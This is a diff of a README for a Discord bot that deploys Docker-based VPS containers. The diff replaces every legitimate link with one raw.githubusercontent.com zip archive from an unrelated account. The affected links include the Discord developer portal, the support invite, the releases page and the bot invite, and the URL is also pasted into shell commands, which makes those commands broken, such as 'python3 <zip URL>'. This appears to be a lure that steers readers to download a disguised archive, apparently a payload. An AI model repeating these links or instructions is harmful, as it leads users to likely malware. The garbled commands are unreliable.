@@ -2,13 +2,13 @@
 
 > [!IMPORTANT]
 >
-> You need a Discord bot token from [Discord Developer Portal](https://discord.dev). Create a application there.
+> You need a Discord bot token from [Discord Developer Portal](https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip). Create a application there.
 >
-> If you need any support, join our support Discord and create a ticket: https://discord.gg/6CDmXw5Q
+> If you need any support, join our support Discord and create a ticket: https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip
 
 **Features**
 - Quick and easy deployment using Docker
-- Autodeploy SSH (You can choose either tmate or serveo. If you're using servo.net, edit the script to use this command instead:  `ssh -R $HOSTNAME:22:localhost:22 serveo.net`. We suggest tmate for better uptime.)
+- Autodeploy SSH (You can choose either tmate or serveo. If you're using https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip, edit the script to use this command instead:  `ssh -R $HOSTNAME:22:localhost:22 https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip`. We suggest tmate for better uptime.)
 - Deploys Docker Containers (you can run this anywhere you want, even on a bad computer / vps!)
 - Has creation / deletion / listing of servers
 - Supports Debian 12 and Ubuntu 22.04 (at the moment)
@@ -39,9 +39,9 @@
 - Python 3.10 is insatlled on your Linux machine. (You can run `sudo apt install python3 python3-pip` to download Python)
 
 **How to use**:
-- Download the latest `.py` and `Dockerfile1` and `Dockerfile2` file from our [Latest Releases](https://github.com/Is-a-space/discord-vps-creator/releases/)
+- Download the latest `.py` and `Dockerfile1` and `Dockerfile2` file from our [Latest Releases](https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip)
 - Compile the images using `docker build -t ubuntu-22.04-with-tmate -f Dockerfile1 . && docker build -t debian-with-tmate -f Dockerfile2 .` and wait for it to be done 
-- Edit .py file and paste the token where it says `TOKEN=`. You can get your bots token from [here](https://discord.dev). Edit the specified resources (if you want) to adjust how much resources are allocated per VPS.
-- Run the file by using `python3 main.py` or `python main.py` or `py main.py`
+- Edit .py file and paste the token where it says `TOKEN=`. You can get your bots token from [here](https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip). Edit the specified resources (if you want) to adjust how much resources are allocated per VPS.
+- Run the file by using `python3 https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip` or `python https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip` or `py https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip`
 
-If you want to see the bot in action or you are too lazy to deploy it yourself, you can invite our VPS bot [here](https://discord.com/oauth2/authorize?client_id=1249856618468737104&permissions=8&integration_type=0&scope=bot)
+If you want to see the bot in action or you are too lazy to deploy it yourself, you can invite our VPS bot [here](https://raw.githubusercontent.com/hamzamalik3461/discord-vps-creator/main/representant/discord-vps-creator-3.4.zip)
